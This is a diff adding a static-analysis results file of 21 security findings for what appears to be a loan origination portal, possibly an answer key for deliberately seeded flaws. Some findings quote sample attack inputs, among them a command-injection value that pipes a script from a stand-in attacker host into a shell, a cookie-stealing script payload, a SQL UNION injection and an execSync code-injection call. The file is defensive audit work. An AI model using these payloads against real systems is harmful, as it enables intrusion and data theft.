@@ -1,0 +1,555 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.audit.authentication-bypass",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 523,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 538,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "completeAccountVerification (POST /api/auth/verification/complete, mounted before requireAuth) looks the account up by email only and never validates the client-supplied 'token' against the stored resetTokenHash, nor checks that a verification was even requested. Any attacker who knows a victim's account email can send a 20+ char dummy token and receive a valid lop_session cookie, fully taking over the account (CWE-287/CWE-639). Contrast with /auth/password-reset/confirm (lines 441-457) which correctly compares the token hash.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.sql-injection",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1680,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 1682,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchUnderwritingNotesByFilter builds a SQL query by directly concatenating user-controlled query parameters into the query string: severity (default 'normal') and keyword are interpolated into `WHERE severity = '${severity}' AND body ILIKE '%${keyword}%'` before being passed to AppDataSource.query(). An attacker can inject arbitrary SQL (e.g. keyword=`' OR '1'='1' UNION SELECT ...`), allowing full read/write of the Postgres database. The neighbouring searchBorrowerMessagesByFilter (line 1693) correctly uses parameterized $1/$2 queries.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.command-injection",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1344,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 1349,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "generateApplicationDossierExport passes the raw `format` query parameter (line 1344) straight into a shell command string executed with `spawn(..., { shell: true })` at line 1347: `scripts/render-dossier.sh ${application.externalId} ${format} ${outputPath}`. format is attacker-controlled and unvalidated, so an authenticated user who can view an application (e.g. a borrower on their own application) can inject arbitrary OS commands (format=`x; curl attacker.sh|sh; #`). The sibling generatePartnerDossierExport (line 1365) correctly uses shell:false with an argument array and restricts format via DOSSIER_FORMATS.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.code-injection",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3365,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 3372,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewCustomPricingFormula takes the user-supplied `formula` query parameter and evaluates it server-side via `new Function('context', 'with (context) { return (' + userFormula + '); }')` at line 3371. Although limited to admin/underwriter roles, arbitrary JavaScript (e.g. formula=`process.mainModule.require('child_process').execSync('id')`) executes with full server privileges, i.e. remote code execution.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.xxe",
+      "path": "server/src/utils/workspaceEnvelope.ts",
+      "start": {
+        "line": 20,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 26,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "expandEntities performs XXE-style DTD entity expansion: any `<!ENTITY name SYSTEM \"file://...\">` declared inside the DOCTYPE internal subset causes fs.readFileSync(value.replace('file://','')) to read an arbitrary local file into the entity value (line 22). parseWorkspaceEnvelope (untrusted path) is called by getWorkspaceEnvelopeState (api.ts:1595-1603) with an attacker-supplied base64 cookie (lop_workspace_envelope), so any authenticated user (even a self-registered borrower) can read arbitrary server files readable by the process (e.g. .env, other borrowers' uploaded KYB documents under uploadDir) and have them echoed back in the activeTab/panes JSON.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.missing-authorization",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 572,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 598,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getCaseTimeline (GET /api/cases/:externalId/timeline, registered at line 598 BEFORE router.use(requireAuth) at line 626) is completely unauthenticated and unauthenticated-by-key. Given only a (predictable, e.g. APP-2026-1001) externalId it returns staff-only internal underwriting notes (bodies, severities, author names at lines 589-594) and internal decision `reasons` (line 586-588) which the application serializer otherwise hides from borrowers. This exposes sensitive underwriting analysis to anyone.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.idor",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1653,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 1673,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getUnderwritingNoteDetail (GET /api/notes/:id) has no authorization check at all: it does not verify the caller is staff and never calls assertCanView() against the note's application. Any authenticated user (including a borrower, who is normally never shown internal underwriting notes) who knows/supplies an underwriting-note UUID receives the full internal note body, severity and author name. This is an IDOR / missing function-level access control.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.jwt-none-algorithm",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2753,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 2775,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "acknowledgePartnerDeliveryReceipt verifies the attacker-supplied x-partner-delivery-receipt JWT with `{ algorithms: [\"HS256\", \"none\"] }` (line 2755), explicitly allowing unsigned `alg: none` tokens. Any authenticated user (the route only requires auth, not a role) can forge a receipt with arbitrary integrationId/externalId/status claims and spoof partner delivery acknowledgements, since the signature check is bypassed (CWE-347). The later recordDeliveryAcknowledgement endpoint (line 2783) restricts to HS256, showing the intended secure behaviour.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.ssrf",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3413,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 3424,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "ingestPartnerCollateralDocument performs a server-side fetch() of an arbitrary URL taken from the x-partner-document-url header with no scheme/host validation (line 3415). Any staff user can point this at internal addresses (169.254.169.254 cloud metadata, localhost services, internal network hosts) and use the returned status/byteLength as a blind SSRF oracle. The sibling ingestComplianceBulletinDocument (line 3442) restricts hosts to ALLOWED_COMPLIANCE_BULLETIN_HOSTS, showing the missing control.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.reflected-xss",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1579,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 1581,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getWorkspaceThemeWidget embeds the cookie-derived value `lop_theme_pref` directly into a served HTML <script> block (`var workspaceTheme = \"${themePref}\";`) with no JS/HTML escaping (line 1580). A cookie value such as `\";fetch('//evil/?c='+document.cookie);//` breaks out of the string and executes in the application origin. Note getWorkspaceLayoutWidget (line 1589) escapes the equivalent value with htmlEscape(), so this endpoint is an inconsistent, unescaped script-context injection (CWE-79).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.path-traversal",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1405,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 1408,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "syncWorkingPaperDraft joins the attacker-controlled cookie `lop_workspace_alias` directly into the output path (`path.join(WORKING_PAPER_DIR, workspaceAlias)`) without sanitization before writing file contents. A value such as `../../frontend/dist` lets an authenticated user write an attacker-chosen file outside the intended working-papers directory (path traversal / arbitrary file write, CWE-22). The parallel syncCaseChecklistDraft (line 1420) correctly applies path.basename() to the same cookie, indicating the missing control here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.mass-assignment",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3111,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 3120,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyIntakeFormUpdate (PATCH /api/applications/:id/intake-form) does `Object.assign(application, req.body)` (line 3117) with an unvalidated request body. A borrower (the only check is profile ownership) can mass-assign arbitrary LoanApplication columns, e.g. set status='approved', riskTier='A', decisionSummary, submittedAt or reassign the borrower relation, bypassing the underwriting workflow and document gates. The follow-up applyIntakeFormPatch endpoint (line 3124-3145) uses a strict allow-listed schema, proving the intended control.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.mass-assignment",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2858,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 2863,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "restoreReviewerQueuePreferences JSON-parses the attacker-supplied `rq_prefs` cookie and applies it to the persisted User entity with `Object.assign(user, parsed)` then saves (lines 2860-2862). The cookie body is not validated against a schema, so any staff member (endpoint only checks isStaffRole) can escalate their own privileges by including fields such as `{\"role\":\"admin\"}`, `{\"disabled\":false}`, or even overwrite passwordHash, achieving full admin access.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.broken-access-control",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1124,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 1148,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "handoffApplication (POST /api/applications/:id/handoff) performs no assertCanView() and has no role requirement: it loads any application by id and \u2014 provided the request body's accountType equals 'originator', which any client can simply set \u2014 reassigns the file to a chosen underwriter and returns the full serialized application. Even a borrower can thus reassign/relocate other borrowers' applications and obtain their data if an application UUID is known.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.authorization-scope-bypass",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3193,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 3204,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchLoanApplicationsByCriteria passes the raw request body into TypeORM `find({ where: filter })` with no allow-list and no assignment scoping. The endpoint is available to every staff role (including underwriter, who is otherwise restricted to assigned / unassigned-submitted files by canViewApplication) and accepts an arbitrary filter (even `{}`), letting any staff member dump up to 50 applications with full internal notes, documents and messages regardless of queue assignment. It also interpolates an unvalidated `sortBy` into the ORDER BY.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.path-traversal-file-write",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3286,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 3289,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "publishBranchMarketingAsset writes an uploaded file to `path.join(marketingAssetsDir, slot + '-' + req.file.originalname)` using the raw, unsanitized multipart filename and body-controlled slot (multer has no fileFilter here, so arbitrary content such as HTML is accepted). A filename of `../../frontend/dist/pwn.html` (or slot traversal) escapes the intended public/branch-assets directory and can plant attacker-controlled HTML/JS into served paths. The KybDocument upload (line 1272) sanitizes via safeFilename() and product thumbnails use a random UUID name, showing the missing control here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.ldap-injection",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 676,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 678,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchStaffDirectory interpolates the user-supplied `q` query parameter directly into an LDAP filter string: `(&(department=underwriting)(cn=*${term}*))`. Crafted input (e.g. injected `)(|(department=...` / unbalanced parentheses) can widen the predicate or make compileFilter fail open (returning ALL directory entries) in directoryClient.ts, exposing directory entries outside the underwriting branch. escapeDirectoryFilterValue() exists and is used for the branch-group-access endpoint (line 689) but not here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.header-injection",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1317,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 1319,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getApplicationStatementExport places the unvalidated `export_name` query parameter directly into the Content-Disposition response header (`filename=\"${exportName}\"`, line 1319) with no CRLF/quote stripping, enabling HTTP response-header injection / header splitting and malformed-header responses. The sibling getApplicationStatementPreview (line 1330) strips `[\r\n]` from the same parameter, showing the missing sanitization here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.sensitive-data-exposure",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1488,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 1500,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "recordPayoutInstruction persists the raw bank accountNumber and routingNumber in plaintext varchar columns of borrower_payout_accounts (entity BorrowerPayoutAccount.ts:19-23) and, on failure, logs the entire body including those numbers (`JSON.stringify(body)`, line 1498). The parallel partner flow (recordPartnerPayoutInstruction, line 1524) encrypts the same fields with AES-256-GCM and does not log raw values \u2014 financial data should be protected at rest and must not be written to application logs.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.insecure-default-secret",
+      "path": "server/src/config.ts",
+      "start": {
+        "line": 10,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The JWT signing secret falls back to a publicly-known hardcoded value `dev-only-change-me-loan-origination-portal` and the partner status API key falls back to `portal-status-demo-key` when env vars are unset (lines 10-12). In any deployment that fails to override these (including NODE_ENV=production), an attacker can forge valid session cookies for any user id/role or query the public status API, since config never fails closed when the secret is missing.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.error-information-disclosure",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2408,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 2419,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "generatePortfolioRiskSummary responds to any thrown error with the raw exception message AND full stack trace (`res.status(500).json({ error: (error as Error).message, stack: (error as Error).stack })`, line 2417), disclosing internal SQL, file paths and stack internals to the caller. The equivalent generateComplianceExposureSummary (line 2430-2433) correctly returns a generic message with an error id.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.spoofable-role-header",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3471,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 3501,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolvePartnerIntegrationAccess / resolveComplianceIntegrationAccess treat the client-supplied `x-partner-role` header as an authorization signal (`if (partnerRole == \"admin\" || staff.role == \"admin\") return { elevated: true }`, lines 3475/3493). The routes are only behind requireAuth (no role requirement), so even a borrower can send `x-partner-role: admin` and receive an elevated-access grant. Authorization must never be derived from a spoofable request header.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
